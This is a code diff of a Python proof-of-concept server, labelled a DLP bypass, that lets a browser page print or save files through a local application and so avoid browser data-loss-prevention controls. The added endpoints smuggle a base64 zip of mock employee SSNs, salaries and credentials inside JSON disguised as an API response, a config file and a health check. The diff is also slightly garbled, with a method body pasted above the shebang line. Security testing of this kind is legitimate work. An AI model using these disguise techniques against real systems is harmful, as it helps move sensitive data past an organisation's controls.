@@ -1,13 +1,45 @@
-#!/usr/bin/env python3
+def send_error_response(self, message):
+        """Send error JSON response"""
+        self.send_response(500)
+        self.send_header('Content-Type', 'application/json')
+        self.send_header('Access-Control-Allow-Origin', '*')
+        self.end_headers()
+        error_data = {"status": "error", "message": message}
+        self.wfile.write(json.dumps(error_data).encode())#!/usr/bin/env python3
 """
 DLP Bypass Proof of Concept - Local HTTP Server
 Demonstrates how local applications can circumvent browser-based security controls
+
+REQUIREMENTS:
+- Python 3.6+ (no additional packages required - uses only standard library)
+
+INSTALLATION:
+No additional packages needed! This script uses only Python standard library modules:
+- http.server (built-in)
+- json (built-in) 
+- os (built-in)
+- tempfile (built-in)
+- zipfile (built-in)
+- datetime (built-in)
+- urllib.parse (built-in)
+- subprocess (built-in)
+- sys (built-in)
+- platform (built-in)
+
+USAGE:
+1. Save this file as: dlp_bypass_server.py
+2. Run: python dlp_bypass_server.py
+3. Open the HTML file in your browser
+4. Click buttons to test bypasses
+
+The server will run on http://127.0.0.1:19847
 """
 
 import json
 import os
 import tempfile
 import zipfile
+import datetime
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from urllib.parse import parse_qs, urlparse
 import subprocess
@@ -38,6 +70,18 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
         elif parsed_path.path == '/download_file':
             # Create a sample file to download
             self.create_and_serve_file()
+            
+        elif parsed_path.path == '/api/document':
+            # Alternative endpoint that looks like a document API
+            self.serve_disguised_download()
+            
+        elif parsed_path.path == '/config.json':
+            # Disguised as a config file
+            self.serve_config_disguised_download()
+            
+        elif parsed_path.path == '/health':
+            # Health check endpoint that serves file
+            self.serve_health_disguised_download()
             
         else:
             self.send_response(404)
@@ -125,31 +169,42 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             # Create a document with the provided content
             content = command_data.get('content', 'Default poem content')
             
-            # Create temporary file
+            # Create temporary file (but don't auto-delete it immediately on Windows)
             temp_dir = tempfile.mkdtemp()
             doc_path = os.path.join(temp_dir, "document_to_print.txt")
+            
+            print(f"[DEBUG] Creating document at: {doc_path}")
             
             with open(doc_path, 'w') as f:
                 f.write("=== DOCUMENT BYPASSED DLP CONTROLS ===\n\n")
                 f.write(content)
                 f.write("\n\n=== PRINTED VIA LOCAL APPLICATION ===")
+                f.write(f"\nGenerated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
             
-            # Send to printer (platform-specific)
+            # Send to printer (on Windows, this now opens Notepad for manual printing)
             success = self.send_to_printer(doc_path)
             
             if success:
-                response = {"status": "success", "message": "Document sent to printer"}
-                print(f"[SECURITY BYPASS] Document printed: {content[:50]}...")
+                if platform.system() == "Windows":
+                    response = {"status": "success", "message": f"Document opened in Notepad for printing. File: {doc_path}"}
+                    print(f"[SECURITY BYPASS] Document opened for printing: {content[:50]}...")
+                    # Don't clean up the file immediately on Windows so Notepad can access it
+                else:
+                    response = {"status": "success", "message": "Document sent to printer"}
+                    print(f"[SECURITY BYPASS] Document printed: {content[:50]}...")
+                    # Clean up on other platforms
+                    os.unlink(doc_path)
+                    os.rmdir(temp_dir)
             else:
                 response = {"status": "warning", "message": "Print command executed (printer may not be available)"}
-            
-            # Clean up
-            os.unlink(doc_path)
-            os.rmdir(temp_dir)
+                # Clean up on failure
+                os.unlink(doc_path)
+                os.rmdir(temp_dir)
             
             self.send_success_response(response)
             
         except Exception as e:
+            print(f"[DEBUG] Print exception: {str(e)}")
             self.send_error_response(f"Print error: {str(e)}")
 
     def handle_download_command(self, command_data):
@@ -163,17 +218,31 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             downloads_path = self.get_downloads_folder()
             file_path = os.path.join(downloads_path, filename)
             
+            # Debug output
+            print(f"[DEBUG] Attempting to save file to: {file_path}")
+            print(f"[DEBUG] Downloads path: {downloads_path}")
+            print(f"[DEBUG] Current working directory: {os.getcwd()}")
+            
             with open(file_path, 'w') as f:
                 f.write("=== FILE BYPASSED DLP CONTROLS ===\n\n")
                 f.write(content)
                 f.write("\n\n=== SAVED VIA LOCAL APPLICATION ===")
             
-            response = {"status": "success", "message": f"File saved to {file_path}"}
+            # Verify file was actually created
+            if os.path.exists(file_path):
+                file_size = os.path.getsize(file_path)
+                print(f"[DEBUG] File successfully created: {file_path} ({file_size} bytes)")
+                response = {"status": "success", "message": f"File saved to {file_path}"}
+            else:
+                print(f"[DEBUG] ERROR: File was not created at {file_path}")
+                response = {"status": "error", "message": f"Failed to create file at {file_path}"}
+            
             print(f"[SECURITY BYPASS] File saved: {file_path}")
             
             self.send_success_response(response)
             
         except Exception as e:
+            print(f"[DEBUG] Exception occurred: {str(e)}")
             self.send_error_response(f"Download error: {str(e)}")
 
     def send_to_printer(self, file_path):
@@ -182,8 +251,12 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
             system = platform.system()
             
             if system == "Windows":
-                # Windows: use notepad to print
-                subprocess.run(["notepad", "/p", file_path], check=True)
+                # Windows: Open in notepad first, let user decide when to print/close
+                print(f"[DEBUG] Opening file in Notepad: {file_path}")
+                # Use regular notepad (not /p flag) so it stays open
+                subprocess.Popen(["notepad", file_path])
+                print(f"[DEBUG] Notepad opened with file. User can manually print via File > Print")
+                return True
             elif system == "Darwin":  # macOS
                 # macOS: use lp command
                 subprocess.run(["lp", file_path], check=True)
@@ -196,8 +269,8 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
                 
             return True
             
-        except subprocess.CalledProcessError:
-            print("Error sending to printer - printer may not be available")
+        except subprocess.CalledProcessError as e:
+            print(f"Error sending to printer: {e}")
             return False
         except FileNotFoundError:
             print("Print command not found - printer may not be configured")
@@ -221,14 +294,119 @@ class DLPBypassHandler(BaseHTTPRequestHandler):
         self.end_headers()
         self.wfile.write(json.dumps(data).encode())
 
-    def send_error_response(self, message):
-        """Send error JSON response"""
-        self.send_response(500)
-        self.send_header('Content-Type', 'application/json')
-        self.send_header('Access-Control-Allow-Origin', '*')
-        self.end_headers()
-        error_data = {"status": "error", "message": message}
-        self.wfile.write(json.dumps(error_data).encode())
+    def serve_disguised_download(self):
+        """Serve file disguised as API response"""
+        try:
+            # Create file content as base64 embedded in JSON
+            file_content = self.create_sensitive_content()
+            import base64
+            encoded_content = base64.b64encode(file_content).decode('utf-8')
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            
+            # Disguise as API response
+            response = {
+                "status": "success",
+                "document_id": "12345",
+                "metadata": {
+                    "title": "Annual Report",
+                    "created": "2024-01-15"
+                },
+                "content": encoded_content,
+                "filename": "annual_report.zip"
+            }
+            self.wfile.write(json.dumps(response).encode())
+            print(f"[SECURITY BYPASS] File served via disguised API endpoint")
+            
+        except Exception as e:
+            self.send_error_response(f"Error serving disguised file: {str(e)}")
+
+    def serve_config_disguised_download(self):
+        """Serve file disguised as configuration"""
+        try:
+            file_content = self.create_sensitive_content()
+            import base64
+            encoded_content = base64.b64encode(file_content).decode('utf-8')
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Cache-Control', 'no-cache')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            
+            # Disguise as config file
+            response = {
+                "app_version": "1.2.3",
+                "environment": "production",
+                "features": {
+                    "download_enabled": True,
+                    "print_enabled": True
+                },
+                "backup_data": encoded_content,  # Hidden here
+                "backup_filename": "backup.zip"
+            }
+            self.wfile.write(json.dumps(response).encode())
+            print(f"[SECURITY BYPASS] File served via config endpoint")
+            
+        except Exception as e:
+            self.send_error_response(f"Error serving config disguised file: {str(e)}")
+
+    def serve_health_disguised_download(self):
+        """Serve file disguised as health check with diagnostic data"""
+        try:
+            file_content = self.create_sensitive_content()
+            import base64
+            encoded_content = base64.b64encode(file_content).decode('utf-8')
+            
+            self.send_response(200)
+            self.send_header('Content-Type', 'application/json')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            
+            # Disguise as health check
+            response = {
+                "status": "healthy",
+                "uptime": "24h 30m",
+                "memory_usage": "45%",
+                "cpu_usage": "12%",
+                "diagnostic_logs": encoded_content,  # Hidden here
+                "log_filename": "diagnostics.zip"
+            }
+            self.wfile.write(json.dumps(response).encode())
+            print(f"[SECURITY BYPASS] File served via health check endpoint")
+            
+        except Exception as e:
+            self.send_error_response(f"Error serving health disguised file: {str(e)}")
+
+    def create_sensitive_content(self):
+        """Create the sensitive file content as bytes"""
+        import io
+        
+        # Create zip in memory
+        zip_buffer = io.BytesIO()
+        with zipfile.ZipFile(zip_buffer, 'w') as zipf:
+            zipf.writestr("employee_data.txt", 
+                "Employee ID,Name,SSN,Salary\n"
+                "001,John Doe,123-45-6789,$75000\n"
+                "002,Jane Smith,987-65-4321,$82000\n"
+                "003,Bob Johnson,555-12-3456,$68000")
+            
+            zipf.writestr("financial_report.txt",
+                "Q4 Financial Report - CONFIDENTIAL\n"
+                "Revenue: $2.5M\n"
+                "Profit: $450K\n"
+                "Projected Growth: 15%")
+            
+            zipf.writestr("access_credentials.txt",
+                "System Access Credentials - TOP SECRET\n"
+                "Database: admin/SecurePass123!\n"
+                "Email Server: mailuser/Email456@\n"
+                "Backup System: backup/BackupKey789#")
+        
+        return zip_buffer.getvalue()
 
 def main():
     port = 19847  # Random high port to avoid conflicts
